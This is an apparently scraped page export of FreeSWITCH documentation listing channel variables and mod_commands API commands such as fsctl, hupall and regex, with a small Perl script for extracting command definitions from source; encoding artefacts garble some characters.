variable_sip_h_type in FreeSWITCHâ„¢. To access that variable, you should strip off the variable_, and just do ${sip_h_type}. Other variables shown in the info app are prepended with channel, which should be stripped as well. The example below show a list of info app variables and the corresponding channel variable names:\nInfo variable name channel variable name Description Channel-State state Current stateÂ of the call Channel-State-Number state_number Integer Channel-Name channel_name Channel name Unique-ID uuid uuid of this channel\u0026rsquo;s call leg Call-Direction direction Inbound or Outbound Answer-State state - Channel-Read-Codec-Name read_codec the read codec variable mean the source codec Channel-Read-Codec-Rate read_rate the source rate Channel-Write-Codec-Name write_codec the destination codec same to write_codec if not transcoded Channel-Write-Codec-Rate write_rate destination rate same to read rate if not transcoded Caller-Username username . Caller-Dialplan dialplan user dialplan like xml, lua, enum, lcr Caller-Caller-ID-Name caller_id_name . Caller-Caller-ID-Number caller_id_number . Caller-ANI ani ANI of caller, frequently the same as caller ID number Caller-ANI-II aniii ANI II Digits (OLI - Originating Line Information), if available. Refer to:Â http://www.nanpa.com/number_resource_info/ani_ii_digits.html Caller-Network-Addr network_addr IP address of calling party Caller-Destination-Number destination_number Destination (dialed) number Caller-Unique-ID uuid This channel\u0026rsquo;s uuid Caller-Source source Source module, i.e. mod_sofia, mod_openzap, etc. Caller-Context context Dialplan context Caller-RDNIS rdnis Redirected DNIS info. See mod_dptools: transferÂ application Caller-Channel-Name channel_name . Caller-Profile-Index profile_index . Caller-Channel-Created-Time created_time . Caller-Channel-Answered-Time answered_time . Caller-Channel-Hangup-Time hangup_time . Caller-Channel-Transfer-Time transfer_time . Caller-Screen-Bit screen_bit . Caller-Privacy-Hide-Name privacy_hide_name . Caller-Privacy-Hide-Number privacy_hide_number This variable tells you if the inbound call is asking for CLIR[Calling Line ID presentation Restriction] (either with anonymous method or Privacy:id method) initial_callee_id_name Sets the callee id name during the 183. This allows the phone to see a name of who they are calling prior to the phone being answered. An example of setting this to the caller id name of the number being dialled: variable_sip_received_ip sip_received_ip . variable_sip_received_port sip_received_port . variable_sip_authorized sip_authorized . variable_sip_mailbox sip_mailbox . variable_sip_auth_username sip_auth_username . variable_sip_auth_realm sip_auth_realm . variable_mailbox mailbox . variable_user_name user_name . variable_domain_name domain_name . variable_record_stereo record_stereo . variable_accountcode accountcode Accountcode for the call. This is an arbitrary value. It can be defined in the user variables in the directory, or it can be set/modified from dialplan. The accountcode may be used to force a specific CDR CSV template for the call. variable_user_context user_context . variable_effective_caller_id_name effective_caller_id_name . variable_effective_caller_id_number effective_caller_id_number . variable_caller_domain caller_domain . variable_sip_from_user sip_from_user . variable_sip_from_uri sip_from_uri . variable_sip_from_host sip_from_host . variable_sip_from_user_stripped sip_from_user_stripped . variable_sip_from_tag sip_from_tag . variable_sofia_profile_name sofia_profile_name . variable_sofia_profile_domain_name sofia_profile_domain_name . variable_sip_full_route sip_full_route The complete contents of the Route: header. variable_sip_full_via sip_full_via The complete contents of the Via: header. variable_sip_full_from sip_full_from The complete contents of the From: header. variable_sip_full_to sip_full_to The complete contents of the To: header. variable_sip_req_params sip_req_params . variable_sip_req_user sip_req_user . variable_sip_req_uri sip_req_uri . variable_sip_req_host sip_req_host . variable_sip_to_params sip_to_params . variable_sip_to_tag sip_to_tag . variable_sip_to_user sip_to_user . variable_sip_to_uri sip_to_uri . variable_sip_to_host sip_to_host . variable_sip_contact_params sip_contact_params . variable_sip_contact_user sip_contact_user . variable_sip_contact_port sip_contact_port . variable_sip_contact_uri sip_contact_uri . variable_sip_contact_host sip_contact_host . variable_sip_invite_domain sip_invite_domain . variable_channel_name channel_name . variable_sip_call_id sip_call_id SIP header Call-ID variable_sip_user_agent sip_user_agent . variable_sip_via_host sip_via_host . variable_sip_via_port sip_via_port . variable_sip_via_rport sip_via_rport . variable_presence_id presence_id . variable_sip_h_P-Key-Flags sip_h_p-key-flags This will contain the optional P-Key-Flags header(s) that may be received from calling endpoint. variable_switch_r_sdp switch_r_sdp The whole SDP received from calling endpoint. variable_remote_media_ip remote_media_ip . variable_remote_media_port remote_media_port . variable_write_codec write_codec . variable_write_rate write_rate . variable_endpoint_disposition endpoint_disposition . variable_dialed_ext dialed_ext . variable_transfer_ringback transfer_ringback . variable_call_timeout call_timeout . variable_hangup_after_bridge hangup_after_bridge . variable_continue_on_fail continue_on_fail . variable_dialed_user dialed_user . variable_dialed_domain dialed_domain . variable_sip_redirect_contact_user_0 sip_redirect_contact_user_0 . variable_sip_redirect_contact_host_0 sip_redirect_contact_host_0 . variable_sip_h_Referred-By sip_h_referred-by . variable_sip_refer_to sip_refer_to The full SIP URI received from a SIP Refer-To: response variable_max_forwards max_forwards . variable_originate_disposition originate_disposition . variable_read_codec read_codec . variable_read_rate read_rate . variable_open open . variable_use_profile use_profile . variable_current_application current_application . variable_ep_codec_string ep_codec_string This variable is only available if late negotiation is enabled on the profile. It\u0026rsquo;s a readable string containing all the codecs proposed by the calling endpoint. This can be easily parsed in the dialplan. variable_rtp_disable_hold rtp_disable_hold This variable when set will disable the hold feature of the phone. variable_sip_acl_authed_by sip_acl_authed_by This variable holds what ACL rule allowed the call. variable_curl_response_data curl_response_data This variable stores the output from the last curl made. variable_drop_dtmf drop_dtmf Set on a channel to drop DTMF events on the way out. variable_drop_dtmf_masking_file drop_dtmf_masking_file If drop_dtmf is true play specified file for every tone received. variable_drop_dtmf_masking_digits drop_dtmf_masking_digits If drop_dtmf is true play specified tone for every tone received. sip_codec_negotiation sip_codec_negotiation sip_codec_negotiation is basically a channel variable equivalent of inbound-codec-negotiation.sip_codec_negotiation accepts \u0026ldquo;scrooge\u0026rdquo; \u0026amp; \u0026ldquo;greedy\u0026rdquo; as values.This means you can change codec negotiation on a per call basis. Caller-Callee-ID-Name - - Caller-Callee-ID-Number - - Caller-Channel-Progress-Media-Time - - Caller-Channel-Progress-Time - - Caller-Direction - - Caller-Profile-Created-Time profile_created - Caller-Transfer-Source - - Channel-Call-State - - Channel-Call-UUID - - Channel-HIT-Dialplan - - Channel-Read-Codec-Bit-Rate - - Channel-Write-Codec-Bit-Rate - - Core-UUID - - Event-Calling-File - - Event-Calling-Function - - Event-Calling-Line-Number - - Event-Date-GMT - - Event-Date-Local - - Event-Date-Timestamp - - Event-Name - - Event-Sequence - - FreeSWITCH-Hostname - - FreeSWITCH-IPv4 - - FreeSWITCH-IPv6 - - FreeSWITCH-Switchname - - Hunt-ANI - - Hunt-Callee-ID-Name - - Hunt-Callee-ID-Number - - Hunt-Caller-ID-Name - - Hunt-Caller-ID-Number - - Hunt-Channel-Answered-Time - - Hunt-Channel-Created-Time - - Hunt-Channel-Hangup-Time - - Hunt-Channel-Name - - Hunt-Channel-Progress-Media-Time - - Hunt-Channel-Progress-Time - - Hunt-Channel-Transfer-Time - - Hunt-Context - - Hunt-Destination-Number - - Hunt-Dialplan - - Hunt-Direction - - Hunt-Network-Addr - - Hunt-Privacy-Hide-Name - - Hunt-Privacy-Hide-Number - - Hunt-Profile-Created-Time profile_created - Hunt-Profile-Index - - Hunt-RDNIS - - Hunt-Screen-Bit - - Hunt-Source - - Hunt-Transfer-Source - - Hunt-Unique-ID - - Hunt-Username - - Presence-Call-Direction - - variable_DIALSTATUS - - variable_absolute_codec_string - - variable_advertised_media_ip - - variable_answersec variable_answermsec variable_answerusec variable_billsec variable_billmsec variable_billusec variable_bridge_channel - - variable_bridge_hangup_cause - - variable_bridge_uuid - - variable_call_uuid - - variable_current_application_response - - variable_direction - - variable_duration variable_mduration variable_uduration variable_inherit_codec - - variable_is_outbound - - variable_last_bridge_to - - variable_last_sent_callee_id_name - - variable_last_sent_callee_id_number - - variable_local_media_ip - - variable_local_media_port - - variable_number_alias - - variable_originate_early_media - - variable_originating_leg_uuid - - variable_originator - - variable_originator_codec - - variable_outbound_caller_id_number - - variable_progresssec variable_progressmsec variable_progressusec variable_progress_mediasec variable_progress_mediamsec variable_progress_mediausec variable_recovery_profile_name - - variable_rtp_use_ssrc - - variable_session_id - - variable_sip_2833_recv_payload - - variable_sip_2833_send_payload - - variable_sip_P-Asserted-Identity - - variable_sip_Privacy - - variable_sip_audio_recv_pt - - variable_sip_cid_type - - variable_sip_cseq - - variable_sip_destination_url - - variable_sip_from_display sip_from_display \u0026lsquo;User\u0026rsquo; element of SIP From: line variable_sip_from_port - - variable_sip_gateway - - variable_sip_gateway_name - - variable_sip_h_P-Charging-Vector - - variable_sip_local_network_addr - - variable_sip_local_sdp_str - - variable_sip_network_ip - - variable_sip_network_port - - variable_sip_number_alias - - variable_sip_outgoing_contact_uri - - variable_sip_ph_P-Charging-Vector - - variable_sip_profile_name - - variable_sip_recover_contact - - variable_sip_recover_via - - variable_sip_reply_host - - variable_sip_reply_port - - variable_sip_req_port - - variable_sip_to_port - - variable_sip_use_codec_name - - variable_sip_use_codec_ptime - - variable_sip_use_codec_rate - - variable_sip_use_pt - - variable_sip_via_protocol - - variable_switch_m_sdp - - variable_transfer_history - - variable_transfer_source - - variable_uuid - - variable_waitsec variable_waitmsec variable_waitusec ","permalink":"https://wdd.js.org/freeswitch/channel-var-list/","summary":"About Channel variables are used to manipulate dialplan execution, to control call progress, and to provide options to applications. They play a pervasive role, as FreeSWITCHâ„¢Â frequently consults channel variables as a way to customize processing prior to a channel\u0026rsquo;s creation, during call progress, and after the channel hangs up.Â ï„œ Click here to expand Table of Contents Variable Expansion We rely on variable expansion to create flexible, reusable dialplans:","title":"é€šé“å˜é‡åˆ—è¡¨"},{"content":"\nUsage CLI See below. API/Event Interfaces mod_event_socket mod_erlang_event mod_xml_rpc Scripting Interfaces mod_perl mod_v8 mod_python mod_lua From the Dialplan An API command can be called from the dialplan. Example:Invoke API Command From DialplanOther examples:Other Dialplan API Command ExamplesAPI commands with multiple arguments usually have the arguments separated by a space:Multiple Arguments\nDialplan UsageIf you are calling an API command from the dialplan make absolutely certain that there isn\u0026rsquo;t already a dialplan application that gives you the functionality you are looking for. See mod_dptools for a list of dialplan applications, they are quite extensive. Extraction Script Mitch Capper wrote a Perl script to extract commands from mod_commands source code. It\u0026rsquo;s tailored specifically for extracting from mod_commands but should work for most other files.Extraction Perl Script#!/usr/bin/perluse strict;open (fl,\u0026ldquo;src/mod/applications/mod_commands/mod_commands.c\u0026rdquo;);my $cont;{Â local $/ = undef;Â $cont = ;}close fl;my %DEFINES;my $reg_define = qr/[A-Za-z0-9_]+/;my $reg_function = qr/[A-Za-z0-9_]+/;my $reg_string_or_define = qr/(?:(?:$reg_define)|(?:\u0026quot;[^\u0026quot;]*\u0026quot;))/;\n#load defineswhile ($cont =~ /Â ^\\s* #define \\s+ ($reg_define) \\s+ \u0026quot;([^\u0026quot;]*)\u0026quot;Â /mgx){Â warn \u0026ldquo;$1 is #defined multiple times\u0026rdquo; if ($DEFINES{$1});Â $DEFINES{$1} = $2;}\nsub resolve_str_or_define($){Â my ($str) = @_;Â if ($str =~ s/^\u0026quot;// \u0026amp;\u0026amp; $str =~ s/\u0026quot;$//){ #if starts and ends with a quote strip them off and return the strÂ return $str;Â }Â warn \u0026ldquo;Unable to resolve define: $str\u0026rdquo; if (! $DEFINES{$str});Â return $DEFINES{$str};}#parse commandswhile ($cont =~ /Â SWITCH_ADD_API \\s* ( ([^,]+) #interface $1Â ,\\s* ($reg_string_or_define) # command $2Â ,\\s* ($reg_string_or_define) # command description $3Â ,\\s* ($reg_function) # function $4Â ,\\s* ($reg_string_or_define) # usage $5Â \\s*);Â /sgx){Â my ($interface,$command,$descr,$function,$usage) = ($1,$2,$3,$4,$5);Â $command = resolve_str_or_define($command);Â $descr = resolve_str_or_define($descr);Â $usage = resolve_str_or_define($usage);Â warn \u0026ldquo;Found a not command interface of: $interface for command: $command\u0026rdquo; if ($interface ne \u0026ldquo;commands_api_interface\u0026rdquo;);Â print \u0026ldquo;$command \u0026ndash; $descr \u0026ndash; $usage\\n\u0026rdquo;;} Core Commands Implemented in http://fisheye.freeswitch.org/browse/freeswitch.git/src/mod/applications/mod_commands/mod_commands.cFormat of Returned DataResults of some status and listing commands are presented in comma delimited lists by default. Data returned from some modules may also contain commas, making it difficult to automate result processing. They may be able to be retrieved in an XML format by appending the string \u0026ldquo;as xml\u0026rdquo; to the end of the command string, or as json using \u0026ldquo;as json\u0026rdquo;, or change the delimiter from comma to something else using \u0026ldquo;as delim |\u0026rdquo;. acl Compare an ip to an Access Control ListUsage: acl \u0026lt;list_name\u0026gt; alias Alias: a means to save some keystrokes on commonly used commands.Usage: alias add | del [|*]Example:freeswitch\u0026gt; alias add reloadall reloadacl reloadxml+OKfreeswitch\u0026gt; alias add unreg sofia profile internal flush_inbound_reg+OKYou can add aliases that persist across restarts using the stickyadd argument:freeswitch\u0026gt; alias stickyadd reloadall reloadacl reloadxml+OKOnly really works from the console, not fs_cli. bgapi Execute an API command in a thread.Usage: bgapi [ ] complete Complete.Usage: complete add |del [|*] cond Evaluate a conditional expression.Usage: cond ? : Operators supported by are:\n== (equal to) != (not equal to) (greater than)\n= (greater than or equal to)\n\u0026lt;Â (less than) \u0026lt;= (less than or equal to) How are values compared?\ntwo strings are compared as strings two numbers are compared as numbers a string and a number are compared as strlen(string) and numbers For example, foo == 3Â evaluates to true, and foo == three to false.\nExamples (click to expand)\nExample:Return true if first value is greater than the secondcond 5 \u0026gt; 3Â ? trueÂ : falsetrueExample in dialplan:Slightly more complex example:\nNote about syntaxThe whitespace around the question mark and colon are required since FS-5945. Before that, they were optional. If the spaces are missing, the cond function will return -ERR. domain_exists Check if a FreeSWITCH domain exists.Usage: domain_exists eval Eval (noop). Evaluates a string, expands variables. Those variables that are set only during a call session require the uuid of the desired session or else return \u0026ldquo;-ERR no reply\u0026rdquo;.Usage: eval [uuid: ]Examples:eval ${domain}10.15.0.94eval Hello, World!Hello, World!eval uuid:e72aff5c-6838-49a8-98fb-84c90ad840d9 ${channel-state}CS_EXECUTE expand Execute an API command with variable expansion.Usage: expand [uuid: ] Example:expand originate sofia/internal/1001%${domain} 9999In this example the value of ${domain} is expanded. If the domain were, for example, \u0026ldquo;192.168.1.1\u0026rdquo; then this command would be executed:originate sofia/internal/1001%192.168.1.1 9999 fsctl Send control messages to FreeSWITCH.USAGE: fsctlÂ [Â api_expansion [on|off] |Â calibrate_clock |Â debug_level [level] |Â debug_sql |Â default_dtmf_duration [n] |Â flush_db_handles |Â hupall |Â last_sps |Â loglevel [level] |Â max_dtmf_duration [n] |Â max_sessions [n] |Â min_dtmf_duration [n] |Â min_idle_cpu [d] |Â pause [inbound|outbound] |Â pause_check [inbound|outbound] |Â ready_check |Â reclaim_mem |Â recover |Â resume [inbound|outbound] |Â save_history |Â send_sighup |Â shutdown [cancel|elegant|asap|now|restart] |Â shutdown_check |Â sps |Â sps_peak_reset |Â sql [start] |Â sync_clock |Â sync_clock_when_idle |Â threaded_system_exec |Â verbose_events [on|off]Â ]\nfsctl arguments api_expansion Usage: fsctl api_expansion [on|off]Toggles API expansion. With it off, no API functions can be expanded inside channel variables like ${show channels} This is a specific security mode that is not often used. calibrate_clock Usage: fsctl calibrate_clockRuns an algorithm to compute how long it actually must sleep in order to sleep for a true 1ms. It\u0026rsquo;s only useful in older kernels that don\u0026rsquo;t have timerfd. In those older kernels FS auto detects that it needs to do perform that computation. This command just repeats the calibration. **debug_levelÂ ** Usage: fsctl debug_level [level]Set the amount of debug information that will be posted to the log. 1 is less verbose while 9 is more verbose. Additional debug messages will be posted at the ALERT loglevel.0 - fatal errors, panic1 - critical errors, minimal progress at subsystem level2 - non-critical errors3 - warnings, progress messages5 - signaling protocol actions (incoming packets, \u0026hellip;)7 - media protocol actions (incoming packets, \u0026hellip;)9 - entering/exiting functions, very verbatim progress\ndebug_sql Usage: fsctl debug_sqlToggle core SQL debugging messages on or off each time this command is invoked. Use with caution on busy systems. In order to see all messages issue the \u0026ldquo;logelevel debug\u0026rdquo; command on the fs_cli interface. default_dtmf_duration Usage: fsctl default_dtmf_duration [int]int = number of clock ticksExample:fsctl default_dtmf_duration 2000This example sets the default_dtmf_duration switch parameter to 250ms. The number is specified in clock ticks (CT) where duration (milliseconds) = CT / 8 or CT = duration * 8The default_dtmf_duration specifies the DTMF duration to use on originated DTMF events or on events that are received without a duration specified. This value is bounded on the lower end by min_dtmf_duration and on the upper end by max_dtmf_duration. So max_dtmf_duration \u0026gt;= default_dtmf_duration \u0026gt;= min_dtmf_duration . This value can be set persistently in switch.conf.xmlTo check the current value:fsctl default_dtmf_duration 0FS recognizes a duration of 0 as a status check. Instead of setting the value to 0, it simply returns the current value. flush_db_handles Usage: fsctl flush_db_handlesFlushes cached database handles from the core db handlers. FreeSWITCH reuses db handles whenever possible, but a heavily loaded FS system can accumulate a large number of db handles during peak periods while FS continues to allocate new db handles to service new requests in a FIFO manner. \u0026ldquo;fsctl flush_db_handles\u0026rdquo; closes db connections that are no longer needed to avoid exceeding connections to the database server. hupall Usage: fsctl hupall \u0026lt;clearing_type\u0026gt; dialed_ext Disconnect existing calls to a destination and post a clearing cause.For example, to kill an active call with normal clearing and the destination being extension 1000:fsctl hupall normal_clearing dialed_ext 1000 last_sps Usage: fsctl last_spsQuery the actual sessions-per-second.fsctl last_sps+OK last sessions per second: 723987253(Your mileage might vary.) loglevel Usage: fsctl loglevel [level]Filter much detail the log messages will contain when displayed on the fs_cli interface. See mod_console for legal values of \u0026ldquo;level\u0026rdquo; and further discussion.The available loglevels can be specified by number or name:0 - CONSOLE1 - ALERT2 - CRIT3 - ERR4 - WARNING5 - NOTICE6 - INFO7 - DEBUG max_sessions Usage: fsctl max_sessions [int]Set how many simultaneous call sessions FS will allow. This value can be ascertained by load testing, but is affected by processor speed and quantity, network and disk bandwidth, choice of codecs, and other factors. See switch.conf.xml for the persistent setting max-sessions. max_dtmf_duration Usage: fsctl max_dtmf_duration [int]Default = 192000 clock ticksExample:fsctl max_dtmf_duration 80000This example sets the max_dtmf_duration switch parameter to 10,000ms (10 seconds). The integer is specified in clock ticks (CT) where CT / 8 = ms. The max_dtmf_duration caps the playout of a DTMF event at the specified duration. Events exceeding this duration will be truncated to this duration. You cannot configure a duration that exceeds this setting. This setting can be lowered, but cannot exceed 192000 (the default). This setting cannot be set lower than min_dtmf_duration. This setting can be set persistently in switch.conf.xml as max-dtmf-duration.To query the current value:fsctl max_dtmf_duration 0FreeSWITCH recognizes a duration of 0 as a status check. Instead of setting the value to 0, it simply returns the current value. min_dtmf_duration Usage: fsctl min_dtmf_duration [int]Default = 400 clock ticksExample:fsctl min_dtmf_duration 800This example sets the min_dtmf_duration switch parameter to 100ms. The integer is specified in clock ticks (CT) where CT / 8 = ms. The min_dtmf_duration specifies the minimum DTMF duration to use on outgoing events. Events shorter than this will be increased in duration to match min_dtmf_duration. You cannot configure a DTMF duration on a profile that is less than this setting. You may increase this value, but cannot set it lower than 400 (the default). This value cannot exceed max_dtmf_duration. This setting can be set persistently in switch.conf.xml as min-dtmf-duration.It is worth noting that many devices squelch in-band DTMF when sending RFC 2833. Devices that squelch in-band DTMF have a certain reaction time and clamping time which can sometimes reach as high as 40ms, though most can do it in less than 20ms. As the shortness of your DTMF event duration approaches this clamping threshold, the risk of your DTMF being ignored as a squelched event increases. If your call is always IP-IP the entire route, this is likely not a concern. However, when your call is sent to the PSTN, the RFC 2833 DTMF events must be encoded in the audio stream. This means that other devices down the line (possibly a PBX or IVR that you are calling) might not hear DTMF tones that are long enough to decode and so will ignore them entirely. For this reason, it is recommended that you do not send DTMF events shorter than 80ms.Checking the current value:fsctl min_dtmf_duration 0FreeSWITCH recognizes a duration of 0 as a status check. Instead of setting the value to 0, it simply returns the current value. min_idle_cpu Usage: fsctl min_idle_cpu [int]Allocates the minimum percentage of CPU idle time available to other processes to prevent FreeSWITCH from consuming all available CPU cycles.Example:fsctl min_idle_cpu 10This allocates a minimum of 10% CPU idle time which is not available for processing by FS. Once FS reaches 90% CPU consumption it will respond with cause code 503 to additional SIP requests until its own usage drops below 90%, while reserving that last 10% for other processes on the machine.Â pause Usage: fsctl pause [inbound|outbound]Pauses the ability to receive inbound or originate outbound calls, or both directions if the keyword is omitted. Executing fsctl pause inbound will also prevent registration requests from being processed. Executing fsctl pause outbound will result in the Critical log message \u0026ldquo;The system cannot create any outbound sessions at this time\u0026rdquo; in the FS log.Use resume with the corresponding argument to restore normal operation. pause_check Usage: fsctl pause_check [inbound|outbound]Returns true if the specified mode is active.Examples:fsctl pause_check inboundtrueindicates that inbound calls and registrations are paused. Use fsctl resume inbound to restore normal operation.fsctl pause_checktrueindicates that both inbound and outbound sessions are paused. Use fsctl resume to restore normal operation. ready_check Usage: fsctl ready_checkReturns true if the system is in the ready state, as opposed to awaiting an elegant shutdown or other not-ready state. reclaim_mem Usage: fsctl reclaim_mem recover Usage: fsctl recoverSends an endpointâ€“specific recover command to each channel detected as recoverable. This replaces â€œsofia recoverâ€ and makes it possible to have multiple endpoints besides SIP implement recovery. resume Usage: fsctl resume [inbound|outbound]Resumes normal operation after pausing inbound, outbound, or both directions of call processing by FreeSWITCH.Example:fsctl resume inbound+OKResumes processing of inbound calls and registrations. Note that this command always returns +OK, but the same keyword must be used that corresponds to the one used in the pause command in order to take effect. save_history Usage: fsctl save_historyWrite out the command history in anticipation of executing a configuration that might crash FS. This is useful when debugging a new module or script to allow other developers to see what commands were executed before the crash. send_sighup Usage: fsctl send_sighupDoes the same thing that killing the FS process with -HUP would do without having to use the UNIX kill command. Useful in environments like Windows where there is no kill command or in cron or other scripts by using fs_cli -x \u0026ldquo;fsctl send_sighup\u0026rdquo; where the FS user process might not have privileges to use the UNIX kill command. shutdown Usage: fsctl shutdown [asap|asap restart|cancel|elegant|now|restart|restart asap|restart elegant]\ncancel - discontinue a previous shutdown request. elegant - wait for all traffic to stop, while allowing new traffic. asap - wait for all traffic to stop, but deny new traffic. now - shutdown FreeSWITCH immediately. restart - restart FreeSWITCH immediately following the shutdown. When giving \u0026ldquo;elegant\u0026rdquo;, \u0026ldquo;asap\u0026rdquo; or \u0026ldquo;now\u0026rdquo; it\u0026rsquo;s also possible to add the restart command: shutdown_check Usage: fsctl shutdown_checkReturns true if FS is shutting down, or shutting down and restarting. sps Usage: fsctl sps [int]This changes the sessions-per-second limit from the value initially set in switch.conf sync_clock Usage: fsctl sync_clockFreeSWITCH will not trust the system time. It gets one sample of system time when it first starts and uses the monotonic clock after that moment. You can sync it back to the current value of the system\u0026rsquo;s real-time clock with fsctl sync_clockNote: fsctl sync_clock immediately takes effect, which can affect the times on your CDRs. You can end up underbilling/overbilling, or even calls hungup before they originated. e.g. if FS clock is off by 1 month, then your CDRs will show calls that lasted for 1 month!See fsctl sync_clock_when_idle which is much safer. sync_clock_when_idle Usage: fsctl sync_clock_when_idleSynchronize the FreeSWITCH clock to the host machine\u0026rsquo;s real-time clock, but wait until there are 0 channels in use. That way it doesn\u0026rsquo;t affect any CDRs. verbose_events Usage: fsctl verbose_events [on|off]Enables verbose events. Verbose events have every channel variable in every event for a particular channel. Non-verbose events have only the pre-selected channel variables in the event headers.See switch.conf.xml for the persistent setting of verbose-channel-events.\nglobal_getvar Gets the value of a global variable. If the parameter is not provided then it gets all the global variables.Usage: global_getvar [] global_setvar Sets the value of a global variable.Usage: global_setvar =Example:global_setvar outbound_caller_id=2024561000 group_call Returns the bridge string defined in a call group.Usage: group_call group@domain[+F|+A|+E]+F will return the group members in a serial fashion separated by | (the pipe character)+A (default) will return them in a parallel fashion separated by , (comma)+E will return them in a enterprise fashion separated byÂ :_: (colon underscore colon).There is no space between the domain and the optional flag. See Groups in the XML User Directory for more information.Please note: If you need to have outgoing user variables set in leg B, make sure you don\u0026rsquo;t have dial-string and group-dial-string in your domain or dialed group variables list; instead set dial-string or group-dial-string in the default group of the user. This way group_call will return user/101 and user/ would set all your user variables to the leg B channel.The B leg receives a new variable, dialed_group, containing the full group name. help Show help for all the API commands.Usage: help host_lookup Performs a DNS lookup on a host name.Usage: host_lookup hupall Disconnect existing channels.Usage: hupall [ ]All channels with set to will be disconnected with code.Example:originate {foo=bar}sofia/internal/someone1@server.com,sofia/internal/someone2@server.com \u0026amp;parkhupall normal_clearing foo barTo hang up all calls on the switch indiscriminately:hupall system_shutdown in_group Determine if a user is a member of a group.Usage: in_group [@] \u0026lt;group_name\u0026gt; is_lan_addr See if an IP is a LAN address.Usage: is_lan_addr json JSON APIUsage: json {\u0026ldquo;command\u0026rdquo; : \u0026ldquo;\u0026hellip;\u0026rdquo;, \u0026ldquo;data\u0026rdquo; : \u0026ldquo;\u0026hellip;\u0026rdquo;}Example\u0026gt; jsonÂ {\u0026ldquo;command\u0026rdquo; : \u0026ldquo;status\u0026rdquo;, \u0026ldquo;data\u0026rdquo; : \u0026ldquo;\u0026rdquo;}Â {\u0026ldquo;command\u0026rdquo;:\u0026ldquo;status\u0026rdquo;,\u0026ldquo;data\u0026rdquo;:\u0026quot;\u0026quot;,\u0026ldquo;status\u0026rdquo;:\u0026ldquo;success\u0026rdquo;,\u0026ldquo;response\u0026rdquo;:{\u0026ldquo;systemStatus\u0026rdquo;:\u0026ldquo;ready\u0026rdquo;,\u0026ldquo;uptime\u0026rdquo;:{\u0026ldquo;years\u0026rdquo;:0,\u0026ldquo;days\u0026rdquo;:20,\u0026ldquo;hours\u0026rdquo;:20,\u0026ldquo;minutes\u0026rdquo;:37,\u0026ldquo;seconds\u0026rdquo;:4,\u0026ldquo;milliseconds\u0026rdquo;:254,\u0026ldquo;microseconds\u0026rdquo;:44},\u0026ldquo;version\u0026rdquo;:\u0026ldquo;1.6.9 -16-d574870 64bit\u0026rdquo;,\u0026ldquo;sessions\u0026rdquo;:{\u0026ldquo;count\u0026rdquo;:{\u0026ldquo;total\u0026rdquo;:132,\u0026ldquo;active\u0026rdquo;:0,\u0026ldquo;peak\u0026rdquo;:2,\u0026ldquo;peak5Min\u0026rdquo;:0,\u0026ldquo;limit\u0026rdquo;:1000},\u0026ldquo;rate\u0026rdquo;:{\u0026ldquo;current\u0026rdquo;:0,\u0026ldquo;max\u0026rdquo;:30,\u0026ldquo;peak\u0026rdquo;:2,\u0026ldquo;peak5Min\u0026rdquo;:0}},\u0026ldquo;idleCPU\u0026rdquo;:{\u0026ldquo;used\u0026rdquo;:0,\u0026ldquo;allowed\u0026rdquo;:99.733333},\u0026ldquo;stackSizeKB\u0026rdquo;:{\u0026ldquo;current\u0026rdquo;:240,\u0026ldquo;max\u0026rdquo;:8192}}} load Load external moduleUsage: load \u0026lt;mod_name\u0026gt;Example:load mod_v8 md5 Return MD5 hash for the given input dataUsage: md5 hash-keyExample:md5 freeswitch-is-awesome765715d4f914bf8590d1142b6f64342e module_exists Check if module is loaded.Usage: module_exists Example:module_exists mod_event_sockettrue msleep Sleep for x number of millisecondsUsage: msleep nat_map Manage Network Address Translation mapping.Usage: nat_map [status|reinit|republish] | [add|del] [tcp|udp] [sticky] | [mapping] \u0026lt;enable|disable\u0026gt;\nstatus - Gives the NAT type, the external IP, and the currently mapped ports. reinit - Completely re-initializes the NAT engine. Use this if you have changed routes or have changed your home router from NAT mode to UPnP mode. republish - Causes FreeSWITCH to republish the NAT maps. This should not be necessary in normal operation. mapping - Controls whether port mapping requests will be sent to the NAT (the command line option of -nonatmap can set it to disable on startup). This gives the ability of still using NAT for getting the public IP without opening the ports in the NAT. Note: sticky makes the mapping stay across FreeSWITCH restarts. It gives you a permanent mapping.Warning: If you have multiple network interfaces with unique IP addresses defined in sip profiles using the same port, nat_map will get confused when it tries to map the same ports for multiple profiles. Set up a static mapping between the public address and port and the private address and port in the sip_profiles to avoid this problem. regex Evaluate a regex (regular expression).Usage: regex |[|][|(n|b)]regex m://[/][/(n|b)]regex m:~~[~][~(n|b)]This command behaves differently depending upon whether or not a substitution string and optional flag is supplied:\nIf a subst is not supplied, regex returns either \u0026ldquo;true\u0026rdquo; if the pattern finds a match or \u0026ldquo;false\u0026rdquo; if not. If a subst is supplied, regex returns the subst value on a true condition. If a subst is supplied, on a false (no pattern match) condition regex returns: the source string with no flag; with the n flag regex returns null which forces the response \u0026ldquo;-ERR no reply\u0026rdquo; from regex; with the b flag regex returns \u0026ldquo;false\u0026rdquo; The regex delimiter defaults to the | (pipe) character. The delimiter may be changed to ~ (tilde) or / (forward slash) by prefixing the regex with m:Examples:regex test1234|\\d \u0026lt;== Returns \u0026ldquo;true\u0026rdquo;regex m:/test1234/\\d \u0026lt;== Returns \u0026ldquo;true\u0026rdquo;regex m:~test1234~\\d \u0026lt;== Returns \u0026ldquo;true\u0026rdquo;regex test|\\d \u0026lt;== Returns \u0026ldquo;false\u0026rdquo;regex test1234|(\\d+)|$1 \u0026lt;== Returns \u0026ldquo;1234\u0026rdquo;regex sip:foo@bar.baz|^sip:(.*)|$1 \u0026lt;== Returns \u0026ldquo;foo@bar.baz\u0026rdquo;regex testingonetwo|(\\d+)|$1 \u0026lt;== Returns \u0026ldquo;testingonetwo\u0026rdquo; (no match)regex m:~30~/^(10|20|40)$/~$1 \u0026lt;== Returns \u0026ldquo;30\u0026rdquo; (no match)regex m:~30~/^(10|20|40)$/~$1~n \u0026lt;== Returns \u0026ldquo;-ERR no reply\u0026rdquo; (no match)regex m:~30~/^(10|20|40)$/~$1~b \u0026lt;== Returns \u0026ldquo;false\u0026rdquo; (no match)Logic in revision 14727 if the source string matches the result then the condition was false however there was a match and it is 1001.regex 1001|/(^\\d{4}$)/|$1\nSee also Regular_Expression reload Reload a module.Usage: reload \u0026lt;mod_name\u0026gt; reloadacl Reload Access Control Lists after modifying them in autoload_configs/acl.conf.xml and as defined in extensions in the user directory conf/directory/*.xmlUsage: reloadacl [reloadxml] reloadxml Reload conf/freeswitch.xml settings after modifying configuration files.Usage: reloadxml show Display various reports, VERY useful for troubleshooting and confirming proper configuration of FreeSWITCH. Arguments can not be abbreviated, they must be specified fully.Usage: show [Â aliases |Â api |Â application |Â bridged_calls 